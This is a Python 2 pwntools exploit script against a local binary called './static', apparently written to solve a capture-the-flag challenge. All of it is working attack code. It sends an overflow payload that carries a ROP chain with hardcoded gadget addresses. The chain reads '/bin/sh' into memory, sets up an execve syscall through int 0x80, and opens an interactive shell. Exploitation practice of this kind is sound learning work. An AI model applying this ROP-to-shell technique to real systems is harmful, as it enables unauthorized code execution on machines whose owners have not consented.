#!/usr/bin/env python2

from pwn import*

p = process('./static')

e = p.elf

p.recvline()            # "this binary seems a lot..."

read_buff = 0x80d8720
stdin_fd = 0

# read '/bin/sh' from stdin to some
# writtable part in memory
payload = fit({
    0x10: e.symbols['read'],
    0x14: 0x806a6dd,         # pop esi; pop edi; pop ebx; ret
    0x18: stdin_fd, 
    0x1c: read_buff,
    0x20: 8,
    0x24: 0x08056114,        # pop eax; pop edx; pop ebx; ret
    0x28: 0x0b,              # eax val for execve
    0x2c: 0,                 # edx val for execve
    0x30: read_buff,         # ebx val for execve
    0x34: 0x0806ef51         # xor ecx, ecx; int 0x80
})

p.sendline(payload)

p.sendline('/bin/sh\x00')

p.interactive()
